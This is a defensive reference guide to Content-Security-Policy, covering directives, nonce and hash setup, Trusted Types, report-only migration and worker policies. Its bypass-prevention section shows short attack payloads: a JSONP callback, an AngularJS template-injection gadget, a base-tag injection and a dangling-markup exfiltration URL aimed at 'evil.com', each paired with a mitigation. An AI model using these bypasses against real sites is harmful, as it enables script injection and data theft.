# CSP Deep Dive

Comprehensive reference for Content-Security-Policy implementation, from directives to advanced patterns.

---

## Table of Contents

1. [Complete Directives Reference](#complete-directives-reference)
2. [Nonce Implementation Patterns](#nonce-implementation-patterns)
3. [Hash Generation](#hash-generation)
4. [strict-dynamic with Trusted Types](#strict-dynamic-with-trusted-types)
5. [CSP in Report-Only Mode for Migration](#csp-in-report-only-mode-for-migration)
6. [Violation Report Analysis](#violation-report-analysis)
7. [CSP for Web Workers](#csp-for-web-workers)
8. [CSP with Service Workers](#csp-with-service-workers)
9. [Eval Alternatives](#eval-alternatives)
10. [CSP Bypass Prevention](#csp-bypass-prevention)

---

## Complete Directives Reference

### Fetch Directives

Control where resources can be loaded from.

| Directive | Controls | Fallback |
|---|---|---|
| `default-src` | Fallback for all fetch directives | None (browser default) |
| `script-src` | JavaScript execution | `default-src` |
| `script-src-elem` | `<script>` elements only | `script-src` → `default-src` |
| `script-src-attr` | Inline event handlers (`onclick`, etc.) | `script-src` → `default-src` |
| `style-src` | CSS loading and inline styles | `default-src` |
| `style-src-elem` | `<style>` and `<link rel="stylesheet">` | `style-src` → `default-src` |
| `style-src-attr` | Inline `style=""` attributes | `style-src` → `default-src` |
| `img-src` | Images and favicons | `default-src` |
| `font-src` | `@font-face` sources | `default-src` |
| `connect-src` | XHR, fetch, WebSocket, EventSource, `sendBeacon` | `default-src` |
| `media-src` | `<audio>`, `<video>`, `<track>` | `default-src` |
| `object-src` | `<object>`, `<embed>`, `<applet>` | `default-src` |
| `frame-src` | `<iframe>`, `<frame>` sources | `child-src` → `default-src` |
| `child-src` | Web Workers and `<iframe>` | `default-src` |
| `worker-src` | `Worker`, `SharedWorker`, `ServiceWorker` | `child-src` → `script-src` → `default-src` |
| `manifest-src` | Web app manifest | `default-src` |
| `prefetch-src` | Prefetch/prerender targets (deprecated) | `default-src` |

### Document Directives

Control document properties.

| Directive | Purpose |
|---|---|
| `base-uri` | Restricts URLs for `<base>` element. Always set to `'none'` or `'self'`. |
| `sandbox` | Enables sandbox mode (like `<iframe sandbox>`). Values: `allow-scripts`, `allow-forms`, `allow-same-origin`, `allow-popups`, `allow-modals`, `allow-top-navigation`. |

### Navigation Directives

| Directive | Purpose |
|---|---|
| `form-action` | Restricts form submission targets. Set to `'self'` or specific endpoints. |
| `frame-ancestors` | Controls who can embed this page (replaces `X-Frame-Options`). Not subject to `default-src` fallback. |
| `navigate-to` | Restricts URLs the document can navigate to (CSP Level 3, limited support). |

### Reporting Directives

| Directive | Purpose |
|---|---|
| `report-uri` | URL to POST violation reports (deprecated, widely supported). |
| `report-to` | Reporting API group name (modern replacement). Requires `Report-To` header. |

### Special Directives

| Directive | Purpose |
|---|---|
| `upgrade-insecure-requests` | Upgrades HTTP resource requests to HTTPS before fetching. |
| `block-all-mixed-content` | Blocks all HTTP resources on HTTPS pages (deprecated — `upgrade-insecure-requests` preferred). |
| `require-trusted-types-for` | Requires Trusted Types for DOM XSS sinks. Value: `'script'`. |
| `trusted-types` | Defines allowed Trusted Types policy names. |

### Source Values

| Value | Meaning |
|---|---|
| `'none'` | Block all sources |
| `'self'` | Same origin (scheme + host + port) |
| `'unsafe-inline'` | Allow inline scripts/styles (dangerous, ignored with nonce/hash) |
| `'unsafe-eval'` | Allow `eval()`, `Function()`, `setTimeout(string)` |
| `'unsafe-hashes'` | Allow specific inline event handlers by hash |
| `'strict-dynamic'` | Trust propagates from nonced/hashed scripts to their loads |
| `'report-sample'` | Include first 40 chars of violating code in reports |
| `'nonce-{base64}'` | Allow elements with matching nonce attribute |
| `'sha256-{base64}'` | Allow elements matching this hash |
| `'sha384-{base64}'` | Allow elements matching this hash |
| `'sha512-{base64}'` | Allow elements matching this hash |
| `'wasm-unsafe-eval'` | Allow WebAssembly compilation (without full `unsafe-eval`) |
| `https:` | Any HTTPS URL |
| `data:` | `data:` URIs (use cautiously in `img-src` only) |
| `blob:` | `blob:` URIs |
| `mediastream:` | `mediastream:` URIs |
| `*.example.com` | Wildcard subdomain matching |

---

## Nonce Implementation Patterns

### Server-Side Rendering (SSR)

Generate a unique nonce per HTTP response. Never reuse across requests.

**Node.js / Express:**

```javascript
import crypto from 'node:crypto';

function cspNonceMiddleware(req, res, next) {
  // 16 bytes = 128 bits of entropy
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;

  // Set CSP header with nonce
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'self' 'nonce-${nonce}'`,
    "object-src 'none'",
    "base-uri 'none'",
  ].join('; '));

  next();
}

// In template rendering
app.get('/', (req, res) => {
  res.render('index', { nonce: res.locals.cspNonce });
});
```

**Template usage (EJS/Pug/Handlebars):**

```html
<script nonce="<%= nonce %>">
  // Inline script — allowed by nonce
  initApp();
</script>
<script nonce="<%= nonce %>" src="/js/app.js"></script>
<style nonce="<%= nonce %>">
  body { margin: 0; }
</style>
```

**Python / Django:**

```python
# middleware.py
import secrets
import base64

class CSPNonceMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        nonce = base64.b64encode(secrets.token_bytes(16)).decode('ascii')
        request.csp_nonce = nonce
        response = self.get_response(request)
        csp = (
            f"default-src 'self'; "
            f"script-src 'self' 'nonce-{nonce}' 'strict-dynamic'; "
            f"style-src 'self' 'nonce-{nonce}'; "
            f"object-src 'none'; base-uri 'none'"
        )
        response['Content-Security-Policy'] = csp
        return response
```

```html
<!-- Django template -->
<script nonce="{{ request.csp_nonce }}">
  initApp();
</script>
```

**Java / Spring Boot:**

```java
@Component
public class CSPFilter implements Filter {
    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        HttpServletResponse response = (HttpServletResponse) res;
        byte[] nonceBytes = new byte[16];
        new SecureRandom().nextBytes(nonceBytes);
        String nonce = Base64.getEncoder().encodeToString(nonceBytes);

        req.setAttribute("cspNonce", nonce);
        response.setHeader("Content-Security-Policy",
            String.format("default-src 'self'; script-src 'self' 'nonce-%s' 'strict-dynamic'; "
                + "object-src 'none'; base-uri 'none'", nonce));

        chain.doFilter(req, res);
    }
}
```

### Single-Page Application (SPA)

SPAs typically load a single HTML shell then hydrate via JS. Nonces work differently:

**Approach 1: Server-rendered shell with nonce (recommended)**

The server generates the initial HTML with nonced script tags. `strict-dynamic` propagates trust to dynamically loaded chunks.

```javascript
// Next.js middleware (middleware.ts)
import { NextResponse } from 'next/server';

export function middleware(request) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
  const csp = [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'self' 'nonce-${nonce}'`,
    "img-src 'self' data: blob:",
    "connect-src 'self' https://api.example.com",
    "object-src 'none'",
    "base-uri 'none'",
  ].join('; ');

  const response = NextResponse.next();
  response.headers.set('Content-Security-Policy', csp);
  response.headers.set('x-nonce', nonce);
  return response;
}
```

**Approach 2: Hash-based CSP for fully static SPAs**

When there's no server to generate nonces (static hosting), use hashes for inline scripts and `strict-dynamic` for dynamically loaded bundles.

```bash
# Generate hash for your inline bootstrap script
echo -n 'window.__APP_CONFIG__={apiUrl:"/api"};' | openssl dgst -sha256 -binary | openssl base64
# Output: abc123...
```

```
Content-Security-Policy: script-src 'sha256-abc123...' 'strict-dynamic'; object-src 'none'; base-uri 'none'
```

**Approach 3: Meta tag CSP (limited)**

`<meta http-equiv="Content-Security-Policy">` works for static sites but does NOT support `frame-ancestors`, `report-uri`, or `sandbox`. Prefer HTTP headers.

---

## Hash Generation

### When to Use Hashes vs Nonces

| Use Case | Nonces | Hashes |
|---|---|---|
| Server renders HTML per request | ✅ Preferred | ✅ Works |
| Static HTML (no server) | ❌ Can't generate | ✅ Required |
| Content changes per request | ✅ Same nonce | ❌ Hash changes |
| Build-time known scripts | ✅ Works | ✅ Preferred |

### Generating Hashes

**Command line:**

```bash
# SHA-256 hash for CSP
echo -n 'console.log("hello")' | openssl dgst -sha256 -binary | openssl base64
# Output: RkpXK0VIblVBRk1iQnJvQlJ3cmhwZz09...

# Full CSP value format
echo -n 'console.log("hello")' | openssl dgst -sha256 -binary | openssl base64 | \
  sed "s/^/'sha256-/; s/$/'/"
# Output: 'sha256-RkpXK0VIblVBRk1iQnJvQlJ3cmhwZz09...'
```

**Node.js:**

```javascript
import crypto from 'node:crypto';

function cspHash(code, algorithm = 'sha256') {
  const hash = crypto.createHash(algorithm).update(code, 'utf8').digest('base64');
  return `'${algorithm}-${hash}'`;
}

// Hash the exact content between <script> tags (no leading/trailing whitespace unless present)
const hash = cspHash('console.log("hello")');
// Use in header: script-src ${hash}
```

**Python:**

```python
import hashlib
import base64

def csp_hash(code: str, algorithm: str = "sha256") -> str:
    h = hashlib.new(algorithm, code.encode("utf-8")).digest()
    b64 = base64.b64encode(h).decode("ascii")
    return f"'{algorithm}-{b64}'"
```

### Hash Pitfalls

- Hash must match the **exact** text content between `<script>` tags, including whitespace, newlines, and encoding.
- Minification, formatting changes, or template variable interpolation will break hashes.
- Browser devtools CSP errors include the expected hash — copy it directly.
- Multiple inline scripts need separate hashes in `script-src`.

---

## strict-dynamic with Trusted Types

### strict-dynamic Behavior

When `'strict-dynamic'` is in `script-src`:
1. Host allowlists (`https:`, `*.example.com`) are **ignored**.
2. `'unsafe-inline'` is **ignored** (keeping it provides backward compatibility).
3. Nonces/hashes are required on root scripts.
4. Scripts loaded by trusted root scripts inherit trust (via `document.createElement('script')`).
5. `document.write('<script ...')` is **blocked**.
6. Parser-inserted scripts (HTML `<script>` without nonce) are **blocked**.

### Trusted Types Integration

Trusted Types prevent DOM XSS by requiring typed objects for dangerous sinks.

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types myPolicy default
```

**Creating a Trusted Types policy:**

```javascript
// Define the policy
const policy = trustedTypes.createPolicy('myPolicy', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScriptURL: (input) => {
    const url = new URL(input, location.origin);
    if (url.origin === location.origin) return url.toString();
    throw new TypeError('Untrusted script URL: ' + input);
  },
  createScript: (input) => {
    throw new TypeError('Script creation blocked');
  },
});

// Usage — the sink now requires a TrustedHTML object
element.innerHTML = policy.createHTML(userInput);
```

**Default policy (catch-all for third-party code):**

```javascript
trustedTypes.createPolicy('default', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScriptURL: (input) => input, // audit these in reports
  createScript: () => { throw new TypeError('Blocked'); },
});
```

### Combining strict-dynamic + Trusted Types

```
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  require-trusted-types-for 'script';
  trusted-types myPolicy default;
  object-src 'none';
  base-uri 'none'
```

This provides defense in depth: `strict-dynamic` controls script loading, Trusted Types controls DOM manipulation sinks.

---

## CSP in Report-Only Mode for Migration

### Migration Strategy

**Phase 1: Baseline with report-only**

Deploy the most restrictive policy you aim for as report-only alongside your existing enforced policy (or no policy):

```
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' 'strict-dynamic' 'nonce-{RANDOM}'; style-src 'self' 'nonce-{RANDOM}'; object-src 'none'; base-uri 'none'; report-to csp-staging
Report-To: {"group":"csp-staging","max_age":86400,"endpoints":[{"url":"https://your-app.com/csp-reports"}]}
```

Let this run for 1-2 weeks to collect comprehensive violation data.

**Phase 2: Analyze and fix**

Group violations by `violated-directive` + `blocked-uri`. Common categories:

| Violation Pattern | Action |
|---|---|
| `inline script` blocked | Add nonces or move to external files |
| `inline style` blocked | Add nonces or use external CSS |
| `eval` blocked | Refactor to avoid `eval()` / `new Function()` |
| Third-party domain blocked | Add to appropriate directive or use `strict-dynamic` |
| `chrome-extension://`, `moz-extension://` | Ignore — browser extension noise |
| `data:` blocked | Add `data:` to relevant directive if legitimate |

**Phase 3: Iterative tightening**

Update report-only policy, redeploy, monitor. Repeat until violations are only expected noise.

**Phase 4: Enforce**

Switch from `Content-Security-Policy-Report-Only` to `Content-Security-Policy`. Keep `report-to` active.

**Phase 5: Monitor**

Run both headers simultaneously — enforced policy + a stricter report-only policy for the next tightening iteration.

### Running Both Headers

You can have BOTH an enforced and a report-only CSP simultaneously:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' 'nonce-{RANDOM}' 'strict-dynamic'; report-to csp-next
```

The enforced policy protects users now. The report-only policy tests the next iteration.

---

## Violation Report Analysis

### Report Format (report-uri)

```json
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "referrer": "https://example.com/",
    "violated-directive": "script-src-elem",
    "effective-directive": "script-src-elem",
    "original-policy": "default-src 'self'; script-src 'nonce-abc123' 'strict-dynamic'",
    "blocked-uri": "https://evil.example.com/inject.js",
    "status-code": 200,
    "source-file": "https://example.com/page",
    "line-number": 42,
    "column-number": 8,
    "disposition": "enforce"
  }
}
```

### Report Format (report-to / Reporting API)

```json
[{
  "type": "csp-violation",
  "age": 10,
  "url": "https://example.com/page",
  "user_agent": "Mozilla/5.0...",
  "body": {
    "documentURL": "https://example.com/page",
    "blockedURL": "inline",
    "violatedDirective": "script-src-elem",
    "effectiveDirective": "script-src-elem",
    "originalPolicy": "default-src 'self'; ...",
    "disposition": "enforce",
    "statusCode": 200,
    "sample": "alert('xss')",
    "sourceFile": "https://example.com/page",
    "lineNumber": 42,
    "columnNumber": 8
  }
}]
```

### Analysis Patterns

**Filter noise first:**

```javascript
function isNoise(report) {
  const blocked = report.blockedURL || report['blocked-uri'] || '';
  const noisePatterns = [
    /^(chrome|moz|safari)-extension:\/\//,  // Browser extensions
    /^about:/,                                // about: pages
    /^blob:/,                                 // Blob URLs from extensions
    /^data:/,                                 // Data URIs from extensions
    /webkit-masked-url/,                      // Safari privacy
  ];
  return noisePatterns.some(p => p.test(blocked));
}
```

**Aggregate by pattern:**

```javascript
// Group by violated-directive + blocked-uri domain
function aggregateReports(reports) {
  const groups = {};
  for (const r of reports) {
    const directive = r.violatedDirective || r['violated-directive'];
    const blocked = r.blockedURL || r['blocked-uri'] || 'inline';
    let domain;
    try { domain = new URL(blocked).hostname; } catch { domain = blocked; }
    const key = `${directive}|${domain}`;
    groups[key] = groups[key] || { count: 0, samples: [] };
    groups[key].count++;
    if (groups[key].samples.length < 3) groups[key].samples.push(r);
  }
  return groups;
}
```

**Key fields for debugging:**

| Field | What it tells you |
|---|---|
| `violated-directive` | Which directive blocked the resource |
| `effective-directive` | The actual directive that applied (after fallback) |
| `blocked-uri` | The resource URL or `inline`/`eval` |
| `source-file` + `line-number` | Where in your code the violation originated |
| `sample` | First 40 chars of the violating script/style (if `'report-sample'` enabled) |
| `disposition` | `enforce` or `report` (which header triggered it) |

---

## CSP for Web Workers

### Worker Types and Directives

| Worker Type | CSP Directive | Fallback Chain |
|---|---|---|
| Dedicated Worker (`new Worker()`) | `worker-src` | `child-src` → `script-src` → `default-src` |
| Shared Worker (`new SharedWorker()`) | `worker-src` | Same as above |
| Service Worker (`navigator.serviceWorker.register()`) | `worker-src` | Same as above |

### Workers Have Their Own CSP

Workers execute in a separate context. The worker's CSP is derived from the **response headers of the worker script itself**, not the page's CSP.

```
# Page CSP — controls WHERE workers can be loaded FROM
Content-Security-Policy: worker-src 'self'

# Worker script response CSP — controls what the WORKER can do
# (set this on the worker .js file's response headers)
Content-Security-Policy: default-src 'none'; connect-src https://api.example.com; script-src 'self'
```

### Inline Workers (Blob URLs)

Inline workers use blob URLs:

```javascript
const code = `self.onmessage = (e) => { postMessage(e.data * 2); }`;
const blob = new Blob([code], { type: 'application/javascript' });
const worker = new Worker(URL.createObjectURL(blob));
```

CSP requirement: `worker-src blob:` (or the fallback directives must allow `blob:`).

**Safer alternative — external worker file:**

```javascript
// Keep workers as separate files
const worker = new Worker('/workers/compute.js');
// CSP: worker-src 'self'
```

### Module Workers

```javascript
const worker = new Worker('/worker.js', { type: 'module' });
```

Module workers follow the same `worker-src` directive but use ES module loading internally. The worker's own CSP governs what modules it can import.

---

## CSP with Service Workers

### Registration Constraints

Service workers can only be registered from pages that share the same origin. The `worker-src` directive (or its fallback chain) must allow the service worker script URL.

```
Content-Security-Policy: worker-src 'self'
```

### Service Worker Scope

Service workers intercept fetch events for their scope. CSP applies to the **original request**, not the service worker response. If a service worker returns a cached response, the page's CSP still validates resources within that response.

### Cache API and CSP

The Cache API in a service worker can store any response. However, when the page uses cached content, the page's CSP still applies. A service worker cannot bypass the page's CSP.

### Service Worker Update CSP

When a service worker updates, the browser fetches the new script. The `worker-src` directive must allow the new script's URL. If the server sets a CSP header on the service worker script response, that CSP governs the worker's execution context.

### Recommended CSP for Apps with Service Workers

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM}' 'strict-dynamic';
  worker-src 'self';
  connect-src 'self' https://api.example.com;
  style-src 'self' 'nonce-{RANDOM}';
  img-src 'self' data:;
  object-src 'none';
  base-uri 'none'
```

---

## Eval Alternatives

CSP blocks `eval()` and related dynamic code execution by default. Here's how to refactor.

### What CSP Blocks (without `'unsafe-eval'`)

- `eval('code')`
- `new Function('code')`
- `setTimeout('code', delay)` (string form)
- `setInterval('code', delay)` (string form)
- `window.execScript('code')` (IE)

### Refactoring Patterns

**`eval()` for JSON parsing:**

```javascript
// ❌ Blocked by CSP
const data = eval('(' + jsonString + ')');

// ✅ Safe alternative
const data = JSON.parse(jsonString);
```

**`eval()` for dynamic property access:**

```javascript
// ❌ Blocked by CSP
const value = eval('obj.' + propertyPath);

// ✅ Safe alternative
function getNestedProperty(obj, path) {
  return path.split('.').reduce((current, key) => current?.[key], obj);
}
const value = getNestedProperty(obj, propertyPath);
```

**`new Function()` for template evaluation:**

```javascript
// ❌ Blocked by CSP
const template = new Function('data', 'return `Hello ${data.name}`');

// ✅ Safe alternative — use a template library or simple replacer
function renderTemplate(template, data) {
  return template.replace(/\{\{(\w+)\}\}/g, (_, key) => data[key] ?? '');
}
renderTemplate('Hello {{name}}', { name: 'World' });
```

**`setTimeout` / `setInterval` with strings:**

```javascript
// ❌ Blocked by CSP
setTimeout('doSomething()', 1000);

// ✅ Safe alternative
setTimeout(() => doSomething(), 1000);
// or
setTimeout(doSomething, 1000);
```

**Dynamic code execution for math expressions:**

```javascript
// ❌ Blocked by CSP
const result = eval(userExpression);

// ✅ Safe alternative — use a math parser library
import { evaluate } from 'mathjs';
const result = evaluate(userExpression);
```

### When You Genuinely Need eval

Some legitimate use cases (developer tools, sandboxes, code editors):

- Use `'wasm-unsafe-eval'` if you only need WebAssembly compilation.
- Isolate eval-requiring code in an `<iframe>` with its own permissive CSP.
- Use a sandboxed iframe: `<iframe sandbox="allow-scripts" csp="script-src 'unsafe-eval'">`.
- Consider server-side evaluation with a sandboxed runtime.

**Never add `'unsafe-eval'` to your main page's CSP.** It re-enables the primary attack vector CSP is designed to block.

---

## CSP Bypass Prevention

### Known Bypass Vectors

**1. JSONP endpoints on whitelisted domains**

```
Content-Security-Policy: script-src https://accounts.google.com
```

If `accounts.google.com` has a JSONP endpoint: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1)` — attacker loads this as a script and executes arbitrary JS.

**Mitigation:** Never allowlist entire domains. Use nonces + `strict-dynamic` instead of domain allowlists.

**2. CDN-hosted libraries with known gadgets**

AngularJS, Vue.js, and other frameworks on public CDNs can be loaded to exploit template injection:

```html
<!-- If cdn.jsdelivr.net is allowlisted -->
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
```

**Mitigation:** Never allowlist CDN domains. Use SRI hashes + nonces, or host libraries yourself.

**3. Base URI injection**

Without `base-uri 'none'`, an attacker can inject `<base href="https://evil.com/">` and all relative script URLs load from the attacker's server.

**Mitigation:** Always include `base-uri 'none'` or `base-uri 'self'`.

**4. Dangling markup injection**

An injection like `<img src="https://evil.com/steal?data=` (unclosed attribute) can capture subsequent page content in the URL.

**Mitigation:** Use nonces (not allowlists), enforce Trusted Types, sanitize all user output.

**5. Subdomain takeover**

If `*.example.com` is in your CSP and `unused.example.com` has a dangling DNS record, an attacker can claim that subdomain and host scripts.

**Mitigation:** Audit DNS records. Avoid wildcard domains in CSP. Use explicit subdomains.

**6. Object/embed bypass**

Without `object-src 'none'`, Flash or other plugins can execute scripts.

**Mitigation:** Always set `object-src 'none'`.

**7. Open redirect on whitelisted origin**

If `trusted.com` has an open redirect and is in your CSP, an attacker can redirect script loads through it.

**Mitigation:** Avoid domain allowlists. Use nonces + `strict-dynamic`.

### CSP Bypass Checklist

- [ ] `base-uri` set to `'none'` or `'self'`
- [ ] `object-src` set to `'none'`
- [ ] No wildcard domains (`*.cdn.com`) in any directive
- [ ] No JSONP-capable domains in `script-src`
- [ ] No public CDNs in `script-src` (or paired with SRI)
- [ ] `script-src` uses nonces or hashes, not domain allowlists
- [ ] `strict-dynamic` enabled with nonce/hash
- [ ] `form-action` restricted (prevents form-based data exfiltration)
- [ ] No `'unsafe-inline'` without nonce/hash (it's ignored with nonce, but don't rely on it alone)
- [ ] No `'unsafe-eval'` (use `'wasm-unsafe-eval'` if needed for Wasm only)
- [ ] `frame-ancestors` set (prevents clickjacking + framing attacks)
- [ ] `require-trusted-types-for 'script'` deployed (prevents DOM XSS sinks)
- [ ] All subdomains in allowlists have been verified (no takeover risk)
- [ ] Report endpoint active for ongoing monitoring
